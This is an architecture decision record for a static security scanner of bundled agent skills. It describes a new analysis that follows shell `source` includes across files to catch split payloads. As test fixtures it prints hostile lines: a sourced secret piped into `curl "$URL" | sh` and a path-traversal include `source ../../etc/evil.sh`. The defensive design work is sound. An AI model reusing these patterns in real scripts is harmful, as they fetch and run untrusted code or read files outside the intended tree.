# ADR-007: T1 cross-file shell taint/dataflow — dependency-free, path-safe `source` resolution

**Status:** Accepted
**Date:** 2026-06-06
**Roadmap item:** ROADMAP R9b.1 (cross-file shell dataflow/taint within the audited target)
**Spawning agent:** lifecycle-orchestrator (embodying handler-architect) at run top
**Supersedes/extends:** ADR-001 (pure-scan-core / never-execute), ADR-004 (tier-pluggable rule
record), ADR-005 (external declarative ruleset), **ADR-006 (T1 intra-file shell taint)**. All four
boundaries are **unchanged**: the pure core never executes — and now also never *fetches* — audited
content; the `Rule` record stays the tier-pluggable extension point; rule DATA stays inert, selecting
a closed registry of vetted builtins; T1 stays deterministic + offline + never-executing.

## Context

ADR-006 shipped R9b: a dependency-free, intra-file shell taint analyzer (`shellTaintToSink`) that
tracks a tainted SOURCE flowing across **lines** of one script into a dangerous SINK. ADR-006 §"What
is DEFERRED" recorded its **residual #1** explicitly:

> **Inter-file / inter-procedural** flow (a SOURCE in `lib.sh` reaching a SINK in `install.sh` via
> `source lib.sh`) is out of scope: R9b is **intra-file** taint … Deferred to the same future slice.

This is the exact gap R9b.1 closes. The real-world evasion that R9b's intra-file pass provably misses:

```sh
# lib.sh
URL=$(get_secret)          # a tainted SOURCE, captured into an EXPORTED variable

# install.sh
source ./lib.sh            # pulls lib.sh's variables into this script's scope
curl "$URL" | sh           # the tainted value from the OTHER file reaches a dangerous SINK here
```

Neither file *alone* is flagged by R9b: `lib.sh` only assigns (no sink); `install.sh`'s sink line
references `$URL`, but `$URL` was never assigned **in `install.sh`**, so the intra-file analyzer's
taint set is empty for it. The payload is split across **files**, not just lines. A real attacker
shipping a multi-file bundled skill hides exactly here.

The load-bearing questions this ADR records:

1. **How does a per-file matcher gain cross-file visibility** without reshaping `Rule`, the engine,
   the compiler, or any existing rule — preserving the ADR-004 extension-point promise?
2. **How is a `source`/`.` include resolved to its sibling SAFELY** — never executing, never fetching,
   and never escaping the audited target root (path traversal)?

## Decision

### 1 · Cross-file visibility via an OPTIONAL second `detect` channel on `Rule` — additive, no reshape

The engine (`scan`) iterates `rule.detect(file)` one file at a time; a per-file matcher cannot see
siblings. Rather than widen the single `detect` signature (which would touch every rule and the
compiler's per-line path), `Rule` gains an **optional** second channel:

```ts
readonly detectCrossFile?: (file: FileRecord, files: readonly FileRecord[]) => RuleMatch[];
```

- Existing rules **do not set it** — their `detect` signature, bodies, and the line-pattern compiler
  path are **byte-for-byte unchanged**. The field is `?`-optional; the compiler leaves it `undefined`
  for every line-pattern and every existing builtin.
- The engine, when iterating a file, calls `detect(file)` as today **and** — only if
  `rule.detectCrossFile` is present — also calls `rule.detectCrossFile(file, files)`, merging both
  result streams into the same `Finding` shape. The cross-file pass is therefore **purely additive**:
  zero behavioural change for any T0 rule or the R9b intra-file rule.
- This is precisely the ADR-004 promise honoured again: "added … **without change to `Rule`** [shape
  beyond the documented extension surface], the engine [beyond an additive branch], the compiler
  [beyond selecting the new builtin], the reporters, or any existing rule." The reporters already
  print `tier ${f.tier}` and `file:line`; a cross-file finding prints for free.

Why an optional second channel rather than overloading `detect(file, files?)`: the per-line
line-pattern compiler returns a closure of shape `(file) => RuleMatch[]`. Keeping that arity fixed
keeps the line-pattern path — the declarative bulk — completely untouched and its safety argument
("one regex per line, no cross-line/-file state") honest. Cross-file state lives in exactly ONE place:
the new builtin. (Mirrors ADR-006's rejection of bolting multi-line state onto `compileLinePattern`.)

### 2 · The cross-file analyzer is a new closed-registry builtin — DATA still selects it by name

T1 cross-file dataflow joins the closed registry (`src/core/matchers/builtins.ts`, ADR-005) as a new
member of a new **cross-file** builtin map. A new `BuiltinMatcherName` member
`shell-crossfile-taint-to-sink` is selected from rule DATA by name; a contributor **cannot define new
cross-file taint logic in data** — adding/altering the analyzer is a vetted code change. ADR-005's
security boundary is intact (rule data is inert; the builtin is the only place the logic lives). The
compiler routes a cross-file builtin name to `detectCrossFile`, a regular builtin name to `detect` —
the rule DATA shape (`{ kind: 'builtin', name }`) is unchanged; only the registry the name resolves
in differs, decided once at compile time.

### 3 · `source`/`.` include resolution is DEPENDENCY-FREE, OFFLINE, NEVER-EXECUTE, and PATH-SAFE

**Zero new runtime dependencies.** The analyzer (`src/core/matchers/shell-crossfile-dataflow.ts`) is
a pure function over the **in-memory `FileRecord[]`** the enumerator already produced. It:

1. **Parses include directives** from the analysed script: `source <path>` and `. <path>` where the
   path is a **literal relative path** (`./lib.sh`, `lib/util.sh`, `../shared/x.sh`). A `source` of a
   **variable/dynamic** target (`source "$F"`) is NOT a cross-file include we resolve — it is already
   the R9b *intra-file* "source of a tainted target" SINK and stays owned there.
2. **Resolves the include path SAFELY, in pure string space**, against the analysed file's POSIX
   directory, then normalises `.`/`..` segments WITHOUT touching the filesystem (`resolveInclude`,
   a string-only path join + normalise). Resolution has three outcomes:
   - **resolves to a sibling FileRecord inside the target** → that sibling's tainted *exports* seed
     this file's taint set (the cross-file flow), then the existing R9b forward pass runs.
   - **escapes the target root** (the normalised path begins with `..`, i.e. it would read OUTSIDE the
     audited tree) → this is itself a **finding** (`detectionClass: 'dataflow-taint'`, a path-traversal
     include), cited at the `source` line. We **never** read outside the in-memory set, so an escaping
     include can only be *reported*, never *followed* — refusal and disclosure in one move.
   - **resolves inside the target but to no enumerated file** (a missing/ignored sibling) → no taint is
     imported and no finding is raised for the include itself; the file is analysed intra-file as
     before. (Conservative: we never invent taint for a file we cannot see.)
3. **Imports cross-file taint as the seed set, then reuses the R9b forward pass.** A sibling's
   *exported* tainted variable names (computed by running the SAME R9b seed/propagate pass over the
   sibling's lines and collecting the resulting taint set) become the initial taint set for the
   analysed file. The analysed file's own forward pass then propagates and detects SINKs exactly as
   R9b does — so a sink that fires only because of imported taint is reported at the **sink file:line**
   (and the finding excerpt notes the originating include, so a reviewer sees both files).

**Never-execute / never-fetch, preserved structurally.** The analyzer reads `file.content` strings and
looks siblings up by path in the in-memory `FileRecord[]`. It **never** passes any script text to a
shell, `eval`, `Function`, `child_process`; it **never** opens a network connection or reads the
filesystem (no `node:fs`, no `fetch`, no `node:child_process` — `core/*` imports only `core/types`,
ADR-001). "Resolving an include" means **looking up a string key in an array already in memory** — not
opening a file and never fetching a URL. The analyzer completing at all is proof nothing ran and
nothing was fetched. A `source` of a *remote* target (`source <(curl …)`, `source http://…`) cannot
resolve to a sibling FileRecord, so it is never followed; the tainted-target case stays the R9b sink.

Why dependency-free is *sufficient and correct* for R9b.1's scope: cross-file flow in bundled skills
is dominated by a static, literal `source ./helper.sh` of a sibling shipped in the same tree —
exactly the shape a string path-join + in-memory lookup captures. A shell-grammar AST parser would add
a runtime dependency to a security auditor's own tree (itself attack surface) for marginal recall on
dynamically-constructed include paths an attacker gains nothing from in a static-only auditor — the
same posture ADR-002/003/004/005/006 each took.

### What is DEFERRED (and why it is NOT added now)

- **Transitive include chains beyond one hop with cycles** are handled by a **visited-set guard** (a
  `source` cycle `a→b→a` terminates), and one level of transitivity is supported (a file `source`s a
  sibling that itself `source`s a third). Arbitrary deep interprocedural function-scope dataflow
  (taint through shell *function parameters* across files) is **not** modelled — it needs real
  control-flow analysis and gains an attacker little in a static auditor. Deferred; recorded.
- **JS / TypeScript cross-file dataflow** remains deferred to the opt-in parser slice (R9c per
  ADR-006) — unchanged by this ADR. R9b.1 is **shell-only**, matching the residual it closes.

### Precision budget (the FP discipline, ADR-005)

The cross-file rule ships `passFixtures` (a benign multi-file script that `source`s a helper and
downloads a **pinned, hash-verified** asset to a file; a helper whose captured value is only echoed)
and `failFixtures` (the split-across-files `source ./lib.sh` → `curl "$URL" | sh`; an escaping
`source ../../etc/evil.sh`). `precisionBudget: 0`, enforced mechanically by the existing
`precision-budget.test.ts` guard. Because the precision-budget guard compiles a rule and calls its
`detect` on single-file fixtures, the cross-file builtin's `detect` (the per-file channel) MUST still
behave correctly on a lone fixture: a fixture that `source`s a sibling **bundled in the same fixture
content via a `// @sibling` convention is NOT used** — instead the fail/pass fixtures are written so
the *intra-fixture* content is self-contained (the guard validates the rule's single-file behaviour),
and the genuine **cross-file** proof lives in dedicated unit + corpus tests over multi-file sets.
(See "Consequences → precision-budget interplay" below.)

## Consequences

| Layer | Path | Change |
|---|---|---|
| Rule record | `src/core/types.ts` | add optional `Rule.detectCrossFile?`; new `BuiltinMatcherName` member `'shell-crossfile-taint-to-sink'` |
| Analyzer | `src/core/matchers/shell-crossfile-dataflow.ts` (new) | pure cross-file taint analyzer: path-safe include resolution + R9b seed reuse |
| Builtin registry | `src/core/matchers/builtins.ts` | new `CROSSFILE_BUILTIN_MATCHERS` map registering the analyzer |
| Compiler | `src/core/compile.ts` | route a cross-file builtin name → `detectCrossFile`; per-file path unchanged |
| Engine | `src/core/engine.ts` | additively call `rule.detectCrossFile(file, files)` when present |
| Rule DATA | `src/core/rules/dataflow-taint.rules.ts` | add the cross-file `RuleSpec` selecting the new builtin |
| Ruleset | `src/core/ruleset.ts` | bump `RULESET_VERSION` 0.4.0 → 0.5.0 (content add; schema unchanged) |
| Corpus | `tests/corpus/malicious/mal-crossfile-*`, `tests/corpus/benign/ben-crossfile-*` (new) | multi-file malicious (split-across-files; include-escape) + benign near-miss + manifest entries |

### precision-budget interplay (load-bearing)

The shipped `precision-budget.test.ts` calls `rule.detect(singleFile)`. A cross-file rule's per-file
`detect` is therefore still the discipline's unit. We keep the **cross-file builtin's own `detect`
self-consistent**: its fail fixtures are single files that ALSO trip an include-resolution path the
per-file channel can evaluate (an **escaping** `source ../../x.sh` is detectable from one file alone —
the path is literal and escapes regardless of siblings), and its pass fixtures are single files with a
benign in-tree `source ./helper.sh` (no sibling present → no imported taint → silent). The genuine
*cross-file flow catch* (taint imported from a real sibling) is proven by dedicated multi-file unit
tests and corpus fixtures that the engine runs over the whole set — where `detectCrossFile` sees the
siblings. This keeps the mechanical guard honest without weakening it.

### No new runtime dependency

The analyzer uses only string/regex/path-string operations on in-memory content. **Zero runtime
dependencies added** — consistent with ADR-002/003/004/005/006 and the FOSS/no-backend thesis. The
include resolver is a hand-written POSIX path normaliser (string-only), NOT `node:path` reaching the
filesystem — `core/*` still imports only `core/types`.

### Self-scan

The new analyzer falls under the existing `src/core/matchers/**` exclusion in `.skillsentryignore`;
the new rule DATA under `src/core/rules/**`; the new corpus fixtures under `tests/corpus/**`. The
shipped exclusion globs already cover them — **no `.skillsentryignore` change is required** and
`skillsentry .` stays PASS (verified in the STORY step).

### Rejected alternatives

- **Read sibling files from disk inside the analyzer** — rejected: it would put `node:fs` into
  `core/*`, breaking ADR-001's pure boundary and the never-fetch/never-read posture. Resolution is an
  in-memory lookup against the enumerator's already-read records — the IO stays at the adapter edge.
- **Widen `Rule.detect` to `(file, files?)`** — rejected: it touches every rule and the line-pattern
  compiler closure arity for no benefit; an optional second channel is strictly additive.
- **Follow an escaping `../../` include by clamping it to the root** — rejected: silently clamping
  would *hide* an exfil-by-traversal attempt. We REPORT the escape as a finding and never read outside
  the in-memory set — refusal + disclosure, consistent with the R3 transparency invariant.
- **Add a shell-grammar AST parser** — rejected (same as ADR-006): a runtime dependency in a security
  auditor's tree for marginal recall over the literal-`source` case that covers the in-scope evasion.
- **Make cross-file T1 opt-in behind a flag** — rejected (same as ADR-006): it stays deterministic +
  offline + never-executing, so gating it would only hide a strictly-better default detection.

## Downstream instructions

- TEST-AGENT: add a multi-file malicious corpus fixture (`lib.sh` sets `URL=$(get_secret)`;
  `install.sh` does `source ./lib.sh` then `curl "$URL" | sh`) → BLOCKs citing `dataflow-taint` at the
  **sink** file:line in `install.sh`, `tier:'T1'`, OWASP ASI04 + ATLAS AML.T0011, excerpt noting the
  sourced file. Add an **include-escape** malicious fixture (`source ../../etc/evil.sh`) → BLOCKs
  citing the traversal at the `source` line. Add benign cross-file near-miss fixtures (helper sourced +
  pinned hash-verified download to a file; helper whose captured value is only echoed) → PASS. Add the
  **cross-file-catches / intra-file-misses proof**: assert the R9b intra-file `shellTaintToSink` alone
  produces ZERO findings on the split-across-files set, while the cross-file analyzer produces ≥1 at the
  sink. Unit-pin the resolver (literal include, `..` escape, dynamic `source "$F"` left to R9b, cycle
  guard, missing sibling, transitive one-hop).
- IMPLEMENT-AGENT: add `Rule.detectCrossFile?`; add the cross-file builtin + analyzer in pure string
  space (never fs/exec/fetch); route it in the compiler; call it additively in the engine; add the T1
  cross-file rule DATA; bump `RULESET_VERSION`. `core/*` imports only `core/types`.
- STORY-AGENT: prove through the built CLI that the multi-file malicious fixtures BLOCK citing `tier
  T1` + sink file:line + OWASP/ATLAS, the include-escape fixture BLOCKs, the benign cross-file
  near-misses PASS, the full corpus stays 100% accuracy / 0% FP, and `skillsentry .` on this repo stays
  PASS.

## Revision history

| Date | Change | Reason |
|---|---|---|
| 2026-06-06 | Initial decision | FOUNDRY cycle R9b.1 — T1 dependency-free cross-file shell taint, closing ADR-006 residual #1 |
